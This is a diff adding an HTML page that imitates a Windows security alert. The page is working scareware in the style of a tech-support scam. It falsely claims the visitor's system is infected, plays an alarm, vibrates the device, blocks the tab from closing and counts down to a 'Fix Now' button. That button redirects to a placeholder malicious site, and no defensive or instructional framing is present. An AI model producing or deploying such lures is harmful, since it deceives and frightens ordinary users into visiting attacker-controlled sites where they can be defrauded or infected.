@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Windows Virus Detected</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      overflow: hidden;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.9);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 10000;
+    }
+
+    .popup {
+      background-color: #ff4444;
+      border: 5px solid #cc0000;
+      border-radius: 10px;
+      padding: 40px;
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+      color: #fff;
+      text-align: center;
+      width: 90%;
+      max-width: 500px;
+      animation: vibrate 0.3s infinite;
+    }
+
+    .popup h1 {
+      font-size: 32px;
+      margin-bottom: 15px;
+    }
+
+    .popup p {
+      font-size: 18px;
+      margin-bottom: 30px;
+    }
+
+    .popup button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #ff1a1a;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .popup button:hover {
+      background-color: #cc0000;
+    }
+
+    .progress-container {
+      width: 100%;
+      height: 20px;
+      background-color: #ccc;
+      border-radius: 10px;
+      margin: 20px auto;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background-color: #ff4444;
+      transition: width 1s linear;
+    }
+
+    .countdown {
+      font-size: 20px;
+      margin-bottom: 20px;
+      color: #fff;
+    }
+
+    .icon {
+      width: 50px;
+      height: 50px;
+      margin: 0 auto 20px;
+      animation: spin 2s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes vibrate {
+      0%, 100% { transform: translate(0); }
+      25% { transform: translate(-3px, 0); }
+      50% { transform: translate(3px, 0); }
+      75% { transform: translate(-3px, 0); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="overlay">
+    <div class="popup">
+      <div class="icon">
+        <img src="https://i.imgur.com/6X6VxVn.png" alt="Windows Icon" width="100%">
+      </div>
+      <h1>⚠️ Windows Security Alert ⚠️</h1>
+      <p>Detected: Malware, Adware, and Spyware</p>
+      <p>Your system is under attack! Please click the button below to remove the threat immediately.</p>
+      <div class="countdown" id="countdown">3 Seconds to Fix</div>
+      <div class="progress-container">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
+      <button onclick="window.location.href='https://yourmaliciouswebsite.com'" id="fixButton">Fix Now</button>
+    </div>
+  </div>
+
+  <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.imgur.com/0v1v3vG.jpg') no-repeat center center; background-size: cover;"></div>
+
+  <script>
+    // Windows alert sound
+    const alertSound = new Audio('https://i.imgur.com/7p7b3sG.mp3');
+    alertSound.play();
+
+    // Vibrate device
+    if (navigator.vibrate) {
+      navigator.vibrate(1000);
+    }
+
+    // Prevent closing the tab
+    window.addEventListener('beforeunload', function (e) {
+      e.preventDefault();
+      e.returnValue = '';
+    });
+
+    // Countdown and progress bar
+    let progress = 0;
+    let interval;
+
+    function startCountdown() {
+      const countdown = document.getElementById("countdown");
+      const progressBar = document.getElementById("progressBar");
+
+      interval = setInterval(() => {
+        progress += 10;
+        progressBar.style.width = progress + "%";
+        countdown.textContent = (3 - Math.floor((progress / 100) * 3)) + " Seconds to Fix";
+
+        if (progress >= 100) {
+          clearInterval(interval);
+          document.getElementById("fixButton").style.display = "block";
+        }
+      }, 1000);
+    }
+
+    startCountdown();
+  </script>
+
+</body>
+</html>
